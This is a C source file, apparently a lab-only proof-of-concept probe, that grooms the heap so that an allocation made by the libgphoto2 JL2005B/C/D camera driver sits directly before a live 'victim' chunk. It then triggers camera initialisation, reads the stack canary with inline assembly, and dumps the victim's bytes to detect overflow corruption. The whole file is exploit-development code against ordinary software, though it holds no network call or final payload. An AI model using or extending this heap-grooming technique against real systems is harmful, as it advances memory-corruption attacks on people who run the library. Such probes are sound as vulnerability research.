/* W168 lab-only local probe (not part of the committed harness).
 * Same canary-safe short reply as W166, but with the heap groomed so a live
 * allocated chunk follows the camera-private allocation. No network/USB. */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <gphoto2/gphoto2.h>
#include <gphoto2/gphoto2-port-info-list.h>

static unsigned long own_canary(void)
{
	unsigned long v;
	__asm__ volatile("mov %%fs:0x28, %0" : "=r"(v));
	return v;
}

int main(int argc, char **argv)
{
	Camera *cam = NULL;
	CameraAbilitiesList *al = NULL;
	CameraAbilities ab;
	GPPortInfoList *il = NULL;
	GPPortInfo pi;
	CameraList *list = NULL;
	const char *name = NULL, *data = NULL;
	unsigned long size = 0;
	CameraFile *file = NULL;
	const char *path = argc > 1 ? argv[1] : "usb:001,001";
	/* gp_camera_init first takes a fixed 0x570 chunk from the front of a
	 * free hole; leave an exact 0x4050 remainder for calloc(1,16448). */
	unsigned char *holes[16], *victims[16];
	unsigned char *hole = NULL, *victim = NULL;
	size_t hole_req = 17848, pitch = 17856;
	int m, idx, rc, n, i, h, kept = 0;

	/* All libgphoto2 setup allocations first: they must not consume hole. */
	if (gp_camera_new(&cam) < GP_OK) return 2;
	if (gp_abilities_list_new(&al) < GP_OK) return 2;
	if (gp_abilities_list_load(al, NULL) < GP_OK) return 2;
	m = gp_abilities_list_lookup_model(al, " JL2005B/C/D camera");
	if (m < 0) return 2;
	if (gp_abilities_list_get_abilities(al, m, &ab) < GP_OK) return 2;
	if (gp_camera_set_abilities(cam, ab) < GP_OK) return 2;
	if (gp_port_info_list_new(&il) < GP_OK) return 2;
	if (gp_port_info_list_load(il) < GP_OK) return 2;
	idx = gp_port_info_list_lookup_path(il, path);
	if (idx < 0) return 2;
	if (gp_port_info_list_get_info(il, idx, &pi) < GP_OK) return 2;
	if (gp_camera_set_port_info(cam, pi) < GP_OK) return 2;

	/* Drain size-matched free bins until a fresh hole and its following
	 * live chunk are adjacent. All rejected pairs stay allocated: a freed
	 * hole would be reused by camera_init's calloc and put free-list
	 * metadata into the overflow path. */
	for (h = 0; h < 16; h++) {
		unsigned char *p = malloc(hole_req);
		unsigned char *v = malloc(0x400);
		if (!p || !v) return 2;
		holes[kept] = p;
		victims[kept] = v;
		kept++;
		if (v == p + pitch) {
			hole = p;
			victim = v;
			break;
		}
	}
	if (!hole) return 2;
	memset(victim, 0x11, 0x400);
	fprintf(stderr, "hole=%p victim=%p delta=%ld kept=%d\n",
		(void *)hole, (void *)victim, (long)(victim - hole), kept);
	free(hole);

	rc = gp_camera_init(cam, NULL);
	printf("gp_camera_init rc=%d owncanary=0x%016lx\n", rc, own_canary());
	if (rc < GP_OK) return 3;
	printf("victim[0..15]=");
	for (i = 0; i < 16; i++) printf("%02x", victim[i]);
	printf("\n");

	if (gp_list_new(&list) < GP_OK) return 2;
	rc = gp_camera_folder_list_files(cam, "/", list, NULL);
	n = gp_list_count(list);
	printf("list_files rc=%d count=%d\n", rc, n);
	if (n > 0) {
		gp_list_get_name(list, n - 1, &name);
		printf("last name=%s\n", name ? name : "(null)");
	}
	gp_list_free(list);

	if (gp_file_new(&file) < GP_OK) return 2;
	rc = gp_camera_file_get(cam, "/", "jl_1023.ppm", GP_FILE_TYPE_NORMAL,
				file, NULL);
	printf("file_get rc=%d\n", rc);
	if (rc == GP_OK) {
		gp_file_get_data_and_size(file, &data, &size);
		printf("size=%lu data=", size);
		for (i = 0; i < 32 && i < (int)size; i++)
			printf("%02x", (unsigned char)data[i]);
		printf("\n");
	}
	gp_file_free(file);
	return 0;
}
